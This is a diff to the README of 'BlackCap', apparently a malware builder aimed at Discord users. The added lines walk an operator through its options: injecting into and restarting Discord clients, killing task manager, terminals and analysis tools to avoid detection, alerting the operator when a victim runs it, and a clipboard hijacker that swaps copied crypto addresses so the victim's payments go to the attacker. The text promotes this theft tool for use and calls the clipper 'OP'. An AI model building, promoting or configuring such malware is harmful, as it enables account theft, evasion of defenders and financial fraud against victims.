@@ -102,8 +102,26 @@ Love ❌ code ✅
 ```d
 @blackcap: Here put your final file name like "blackcap_is_best" or "KSCH_the_Goat" 🤓
 ```
+![](https://media.discordapp.net/attachments/912038729626058853/1062468541967773756/image.png)
+```d
+@blackcap: This is a option to "KILL" all discord clients opened and to restart them with the blackcap injection (so i recommand "yes")
+```
+![](https://media.discordapp.net/attachments/912038729626058853/1062469117954768998/image.png)
+```d
+@blackcap: This is a option to "KILL" all process which could analyze the properties of blackcap, such as the task manager, 
+the terminal or even analysis tools (so i recommand "yes")
+```
+![](https://media.discordapp.net/attachments/912038729626058853/1062469614036078642/image.png)
+```d
+@blackcap: This is a option to ping when someone run BlackCap you can specify "everyone" or "here"
+```
+![](https://media.discordapp.net/attachments/912038729626058853/1062470764609151016/image.png)
+```d
+@blackcap: This option replaces each of the crypto addresses copied by the victim with yours, 
+it will not realize that it is not the same and during a payment the cryptomoney will be sent to your address
 
-
+//Yeah, that OP i know
+```
 
 ## <a id="changelog"></a>💭 〢 ChangeLog
 
